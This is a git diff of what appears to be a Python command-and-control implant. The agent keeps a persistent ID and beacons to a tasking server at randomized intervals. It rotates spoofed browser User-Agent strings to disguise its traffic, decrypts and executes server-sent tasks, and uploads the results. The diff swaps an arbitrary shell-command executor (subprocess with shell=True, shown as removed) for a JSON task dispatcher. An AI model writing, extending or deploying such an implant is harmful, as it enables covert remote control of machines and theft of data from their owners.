@@ -2,11 +2,12 @@ import time
 import uuid
 import random
 import requests
-import subprocess
 import platform
 import getpass
 import os
+import json
 from common.cryptography_helpers import encrypt_string, decrypt_string
+from .dispatcher import execute_task as dispatch_task
 
 # Configuration
 SERVER_URL = "http://127.0.0.1:5000"
@@ -15,9 +16,12 @@ RESULT_ENDPOINT = "/api/upload"
 SLEEP_MIN = 10     # Minimum sleep in seconds
 SLEEP_MAX = 30     # Maximum sleep in seconds
 
+AGENT_PATH = os.path.abspath(__file__)
 
-BASE_DIR = os.path.dirname(__file__)
-ID_FILE = ".agent_id"
+
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+ID_FILE = os.path.join(BASE_DIR, ".agent_id")
+
 def load_or_create_agent_id():
     # if there is an ID file, read and return it
     if os.path.exists(ID_FILE):
@@ -46,7 +50,6 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
-
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 13; SM-A135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
@@ -71,21 +74,28 @@ def beacon():
             task = data.get("task")
             if task:
                 try:
-                    execute_task(decrypt_string(task))
+                    execute_task(task)
                 except Exception as e:
                     print(f"[!] Task decrypt/execute failed: {e}")
     except Exception as e:
         print(f"[!] Beacon error: {e}")
 
-def execute_task(task):
-    
-    
+def execute_task(task_encrypted):
     try:
-        print(f"[+] Executing task: {task}")
-        result = subprocess.check_output(task, shell=True, stderr=subprocess.STDOUT)
-        post_result(result.decode())
-    except subprocess.CalledProcessError as e:
-        post_result(e.output.decode())
+        decrypted = decrypt_string(task_encrypted)
+        task_obj = json.loads(decrypted)
+        print(f"[+] Executing structured task: {task_obj}")
+        
+        result = dispatch_task(task_obj)
+        post_result(json.dumps(result))
+        
+    except Exception as e:
+        error_result = {
+            "status": "error",
+            "message": str(e)
+        }
+        post_result(json.dumps(error_result))
+        
 
 def post_result(result):
     headers = {"User-Agent": random.choice(USER_AGENTS)}
